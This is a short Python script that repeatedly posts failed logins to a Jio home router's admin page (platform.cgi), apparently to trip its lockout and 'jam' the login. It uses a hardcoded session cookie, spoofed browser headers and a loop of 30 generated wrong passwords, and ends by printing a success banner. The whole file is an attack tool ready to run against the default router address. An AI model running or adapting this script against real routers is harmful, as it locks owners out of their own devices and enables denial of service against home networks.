import random
import requests
import pyfiglet
import os

# COLOR
green = '\033[92m'
purple = '\033[95m'
red = '\033[91m'
cyan = '\033[96m'
yellow = '\033[93m'
bold = '\033[1m'
end = '\033[0m'

colorArr = [green, purple, red, cyan, yellow]
color = random.choice(colorArr)
fig = pyfiglet.figlet_format(" J i o ", font = "alligator" )   # pyfiglet
os.system('cls')
print(fig)

jio_lan_ip = input(f"{cyan}Enter your Jio-Router IP {end}{yellow}(Press enter for default: 192.168.29.1):{end} {green}")
print(f'{end}')
if(jio_lan_ip == ""):
    jio_lan_ip = '192.168.29.1'

username = 'admin'
password = 'somepass'
cookie = 'b5080ad6185a72e3681f100aab8a428'
cookies = {
    'TeamF1Login': cookie,
}

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Origin': f'http://{jio_lan_ip}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': f'http://{jio_lan_ip}/',
    'Accept-Language': 'en-US,en;q=0.9',
}


for i in range(1,31):
    password+=str(i)+str(2)
    data = {
        'thispage': 'index.html',
        'users.username': username,
        'users.password': password,
        'button.login.users.dashboard': 'Login'
    }
    response = requests.post(f'http://{jio_lan_ip}/platform.cgi', headers=headers, cookies=cookies, data=data, verify=False)
    print(f'{cyan}Sending keys: {end}{green}{username}{yellow}:{end}{password}{end}')
    password='somepass'
    response.close()

print(f'{cyan}Jammed Successfully!!!{end}')
print(f'\nCREDITS:- {green}@0xchirantan{end}\n')
